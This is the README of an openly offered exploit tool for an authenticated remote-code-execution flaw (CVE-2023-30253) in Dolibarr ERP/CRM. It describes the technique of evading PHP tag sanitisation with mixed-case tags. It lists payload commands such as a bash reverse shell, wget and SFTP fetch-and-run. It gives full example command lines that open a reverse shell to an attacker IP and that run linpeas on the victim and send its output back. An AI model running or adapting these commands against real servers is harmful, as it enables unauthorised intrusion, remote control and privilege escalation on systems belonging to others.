# DolibabyPhp

An authenticated RCE exploit for Dolibarr ERP/CRM CVE-2023-30253.

## Installation

You can either install the package from the PyPi repository with `pip` or `git clone` the source directly from GitHub.

```shell
pip install dolibabyphp
dolibabyphp -h
```

## Usage

```txt
Usage: dolibabyphp [OPTIONS] TARGET_URL USERNAME PASSWORD COMMAND [ARGS]...

  This exploit will log into the Dolibarr web server at the specified target URL
  with the provided username and password. After that it will attempt to create
  a web page with a unique name. Once created, it will modify the web page to
  include the custom PHP code bypassing the sanitation check by not using only
  lowercase letters (e.g. PHP or pHp instead of php). There are multiple
  payloads to choose from After the payload has finished running, the web page
  will be deleted.

Options:
  --site-name TEXT       Specify a name to use when creating a site on the
                         target. Defaults to UUIDv4.
  --page-name TEXT       Specify a name to use when creating a page on the
                         target. Defaults to UUIDv4.
  --page-title TEXT      Specify a title for the page. Defaults to the page
                         name.
  --proxy TEXT           Specify a proxy URL for use in all requests.
  -o, --output FILENAME  Specify a file path to output the results of the
                         payload to. Defaults to stdout.
  -h, --help             Show this message and exit.

Commands:
  bash-reverse-shell     Spawns a bash shell on the victim machine and...
  cleanup                Runs the cleanup script on the target for given site...
  custom-php-payload     Specify your own PHP payload to be run on the victim...
  custom-system-payload  Specify your own payload to be run via PHP system()...
  sftp                   SFTPs to the attacker machine, downloads the...
  wget                   Downloads the file at the specified URL to to the...
```

### Examples

```shell
# Reverse shell with Bash
dolibabyphp http://example.com/ username1 pass_word23 bash-reverse-shell --lhost 1.2.3.4 --lport 4444

# Testing with a proxy
dolibabyphp --proxy http://127.0.0.1:8080 http://example.com/ username1 pass_word23 custom-system-payload --payload "uname -a"

# SFTP linpeas to the target, execute it, and save the output to a file on the attacker machine.
dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 sftp --private-key-file ./id_ed25519 sftp://me@1.2.3.4:2222/linpeas.sh ./style.css
```

## Running from source

In order to run the project from the source code, you can either use `rye run` or make sure you add the `src/` directory to the `PYTHONPATH` and then import the module `dolibabyphp` with the `-m` flag.

```shell
# With rye
rye run dolibabyphp

# Without rye
PYTHONPATH="$(pwd)/src/" python -m dolibabyphp
```
